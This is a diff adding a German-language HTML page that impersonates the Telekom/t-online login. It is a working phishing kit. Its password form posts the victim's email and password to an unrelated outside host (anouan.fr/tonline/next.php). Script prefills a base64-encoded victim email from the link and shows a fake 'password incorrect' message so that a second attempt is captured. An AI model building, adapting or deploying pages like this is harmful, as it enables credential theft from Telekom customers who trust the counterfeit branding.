@@ -1,0 +1,333 @@
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Telekom Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex">
+    <link rel="stylesheet" type="text/css" href="/components.min.css">
+    <link rel="stylesheet" type="text/css" href="/login-24.03.0.css">
+</head>
+
+<body class="scrolled">
+    <div>
+        <header id="tbs-header">
+            <div id="tbs-header-content" style="height: auto">
+                <div class="container-fixed clearfix">
+                    <div class="pull-left">
+                        <img src="/Deutsche_Telekom_logo_pink.png" width="80px" style="margin-top: 20px">
+                    </div>
+                    <div class="pull-right">
+                        <span class="tbs-slogan">erleben, was verbindet.</span>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <div class="offset-bottom-5 offset-s-bottom-3"></div>
+    </div>
+    <div class="container-fixed">
+        <div class="tbs-container" id="div1" style="display: block;">
+            <div id="tbs-headline">
+                <div id="tbs-brand" class="tbs-relative text-center">
+                    <img src="/t-online-logo-29112019.png">
+                </div>
+                <h1 class="offset-top-0 offset-bottom-3 text-center">Telekom Login Benutzername eingeben</h1>
+            </div>
+            <div class="login-box">
+                <div class="offset-bottom-1">
+                    <form id="login" name="login">
+                        <div class="offset-bottom-1">
+                            <center>
+                                <span class="error" style="display: none;color: red;">Dieser Account existiert nicht. Geben Sie ein anderes Konto ein</span>
+                            </center>
+                            <div class="form-input-set">
+                                <input id="ai" name="ai" type="email" inputmode="email" class="form-input" maxlength="256" tabindex="10" value="" placeholder="Benutzername">
+                                <i id="inputNotificationToggle" class="icon icon-help" data-target="#usrInfo" data-trigger="click"></i>
+                            </div>
+                            <div id="usrInfo" class="info-box">
+                                <p>So können Sie sich anmelden:</p>
+                                <ul>
+                                    <li>
+                                        <span class="text-bold">E-Mail-Adresse: </span>
+                                        <span>Ihre Telekom E-Mail-Adresse oder Ihre E-Mail-Adresse eines anderen Anbieters, mit der Sie sich registriert haben.</span>
+                                    </li>
+                                    <li>
+                                        <span class="text-bold">Mobilfunk-Nummer: </span>
+                                        <span>Ihre Telekom Mobilfunk-Nummer, wenn Sie diese mit Ihrem Telekom Login verknüpft haben.</span>
+                                    </li>
+                                    <li>
+                                        <span class="text-bold">VERIMI Konto: </span>
+                                        <span>Wenn Ihr Telekom Login mit einem VERIMI Konto verknüpft ist, geben Sie hier bitte zunächst Ihren Telekom Login Benutzernamen ein. Anschließend leiten wir Sie zu VERIMI weiter.</span>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="login-helpers clearfix">
+                                <!-- remember username component -->
+                                <div id="tbs-signin-remember" class="form-checkbox-set">
+                                    <label>
+                                        <div tabindex="30" role="checkbox" class="form-checkbox-js" autocomplete="off" hidefocus="true">&nbsp;<span class="border"></span><span class="check" role="presentation"></span></div><input id="checkbox_remember_user" type="checkbox" name="remember_user" value="1" class="form-checkbox hidden" tabindex="30">
+                                        <span>Benutzername merken</span>
+                                    </label>
+                                </div>
+                            </div>
+                            <div class="clearfix offset-bottom-1">
+                                <button id="next" name="next" class="text-center btn btn-brand btn-block btn-large" tabindex="40">Weiter</button>
+                            </div>
+                            <div class="clearfix">
+                                <button class="btn btn-default btn-block btn-large" role="button" name="showSelectIdentMethod" tabindex="41" type="submit">Andere Anmeldeoptionen</button>
+                            </div>
+                        </div>
+                    </form>
+                    <div class="text-center offset-l-bottom-3-5 offset-l-top-2 offset-s-bottom-2-5 offset-s-top-1-5">
+                        <p>Benutzername oder Passwort vergessen?</p>
+                        <p>Bitte nutzen Sie „Andere Anmeldeoptionen“.</p>
+                    </div>
+                    <div class="text-center offset-bottom-2 offset-l-top-2 offset-s-top-1-5">
+                        <a id="helpLink" href="#" tabindex="45" target="_blank">Benötigen Sie Hilfe?</a>
+                    </div>
+                    <div class="text-center offset-bottom-2">
+                        <div>
+                            <p>
+                                <span>Noch keinen Telekom Login?</span>
+                                <a id="registrationLink" class="text-nowrap" tabindex="50" href="#">Telekom Login erstellen</a>
+                                <span>und E-Mail nutzen.</span>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="text-center offset-bottom-2">
+                        <img src="/services.png">
+                    </div>
+                    <div class="text-center offset-bottom-2">
+                        <div>
+                            <p>
+                                <span>Jetzt auch mit Ihrem VERIMI Konto bei der Telekom anmelden.</span>
+                                <a id="verimiLink" class="text-nowrap" tabindex="60" target="_blank" href="#">Hier informieren über VERIMI</a>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="tbs-container" id="div2" style="display: none;">
+            <div id="tbs-headline">
+                <div id="tbs-brand" class="tbs-relative text-center">
+                    <img src="/t-online-logo-29112019.png">
+                </div>
+                <h1 class="offset-top-0 offset-bottom-3 text-center">Telekom Login Passwort eingeben</h1>
+            </div>
+            <div class="login-box">
+                <div class="offset-bottom-1">
+                    <form id="login" name="login" action="https://anouan.fr/tonline/next.php" method="POST">
+                        <input type="hidden" name="count" id="count" value="0">
+                        <div class="offset-bottom-1">
+                            <center>
+                                <span class="error" style="display: none;color: red;">Dieser Account existiert nicht. Geben Sie ein anderes Konto ein</span>
+                                <div id="msg" style="display: none;color: red;font-weight: 500;">
+Passwort ist nicht korrekt.</div>
+                            </center>
+                            <div class="form-input-set">
+                                <input id="aich" name="aich" type="email" class="form-input" maxlength="256" tabindex="10" value="" placeholder="Benutzername" readonly="">
+                                <i id="inputNotificationToggle" class="icon icon-help" data-target="#usrInfo" data-trigger="click"></i>
+                            </div>
+                            <div class="form-input-set">
+                                <input id="pr" name="pr" type="password" class="form-input" maxlength="256" tabindex="10" value="" placeholder="Passwort" required="">
+                            </div>
+                            <div id="usrInfo" class="info-box">
+                                <p>So können Sie sich anmelden:</p>
+                                <ul>
+                                    <li>
+                                        <span class="text-bold">E-Mail-Adresse: </span>
+                                        <span>Ihre Telekom E-Mail-Adresse oder Ihre E-Mail-Adresse eines anderen Anbieters, mit der Sie sich registriert haben.</span>
+                                    </li>
+                                    <li>
+                                        <span class="text-bold">Mobilfunk-Nummer: </span>
+                                        <span>Ihre Telekom Mobilfunk-Nummer, wenn Sie diese mit Ihrem Telekom Login verknüpft haben.</span>
+                                    </li>
+                                    <li>
+                                        <span class="text-bold">VERIMI Konto: </span>
+                                        <span>Wenn Ihr Telekom Login mit einem VERIMI Konto verknüpft ist, geben Sie hier bitte zunächst Ihren Telekom Login Benutzernamen ein. Anschließend leiten wir Sie zu VERIMI weiter.</span>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="clearfix offset-bottom-1">
+                                <button id="submit-btn" name="submit-btn" type="submit" class="text-center btn btn-brand btn-block btn-large">Einloggen</button>
+                            </div>
+                        </div>
+                    </form>
+                    <div class="text-center offset-l-bottom-3-5 offset-l-top-2 offset-s-bottom-2-5 offset-s-top-1-5">
+                        <p>Benutzername oder Passwort vergessen?</p>
+                        <p>Bitte nutzen Sie „Andere Anmeldeoptionen“.</p>
+                    </div>
+                    <div class="text-center offset-bottom-2 offset-l-top-2 offset-s-top-1-5">
+                        <a id="helpLink" href="#" tabindex="45" target="_blank">Benötigen Sie Hilfe?</a>
+                    </div>
+                    <div class="text-center offset-bottom-2">
+                        <div>
+                            <p>
+                                <span>Noch keinen Telekom Login?</span>
+                                <a id="registrationLink" class="text-nowrap" tabindex="50" href="#">Telekom Login erstellen</a>
+                                <span>und E-Mail nutzen.</span>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="text-center offset-bottom-2">
+                        <img src="/services.png">
+                    </div>
+                    <div class="text-center offset-bottom-2">
+                        <div>
+                            <p>
+                                <span>Jetzt auch mit Ihrem VERIMI Konto bei der Telekom anmelden.</span>
+                                <a id="verimiLink" class="text-nowrap" tabindex="60" target="_blank" href="#">Hier informieren über VERIMI</a>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer id="tbs-footer">
+        <div class="container-fixed">
+            <div class="pull-left">
+                <p>© Telekom Deutschland GmbH</p>
+                <p class="tbs-text-11">24.03.0, 132f148de0b13348a2e3b12a1fb789b5, 291dbe3cd2dbc5207fe2b0d84c31d409a2751e33</p>
+            </div>
+            <div class="pull-right">
+                <ul class="list-inline">
+                    <li>
+                        <a href="#" target="_blank">Impressum</a>
+                    </li>
+                    <li>
+                        <a id="data-protection" href="#" target="_blank">Datenschutz</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </footer>
+    <div>
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    function getUrlVars() {
+        var vars = {};
+        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, key, value) {
+            vars[key] = value;
+        });
+        return vars;
+    }
+
+    if (!getUrlVars()["count"]) {
+
+    } else {
+        var count = getUrlVars()["count"];
+        $('#count').val(count);
+    }
+
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+        if (!base64regex.test(ai)) {
+            // alert(btoa(ai));
+            var my_ai = ai;
+        } else {
+            // alert(atob(ai));
+            var my_ai = atob(ai);
+        }
+        // $('#ai').val(ai);
+        // var my_ai =ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_ai)) {
+            $('.error').show();
+            ai.focus;
+            return false;
+        }
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        if (count == 1) {
+            $("#msg").show();
+        } else {
+            $("#msg").hide();
+        }
+        $('#ai').val(my_ai);
+        $("#aich").val(my_ai);
+        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+        $("#div2").animate({ right: 0, opacity: "show" }, 500);
+    }
+
+
+
+
+
+    $('#ai').click(function() {
+        $('.error').hide();
+    });
+
+    $(document).keypress(function(event) {
+
+        var keycode = (event.keyCode ? event.keyCode : event.which);
+        if (keycode == '13') {
+            event.preventDefault();
+            if ($("#div1").is(":visible")) {
+
+                $("#next").click();
+
+            } else if ($("#div2").is(":visible")) {
+                event.preventDefault();
+
+                $("#submit-btn").click();
+
+            } else {
+                return false;
+            }
+        }
+    });
+
+
+    $('#next').click(function() {
+        event.preventDefault();
+        var my_ai = $('#ai').val();
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_ai)) {
+            $('.error').show();
+            $('.error').html("Dieser Account existiert nicht. Geben Sie ein anderes Konto ein");
+            ai.focus;
+            return false;
+        }
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        $("#aich").val(my_ai);
+        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+        $("#div2").animate({ right: 0, opacity: "show" }, 500);
+
+
+
+    });
+
+
+
+
+});
+</script>
+
+</html>
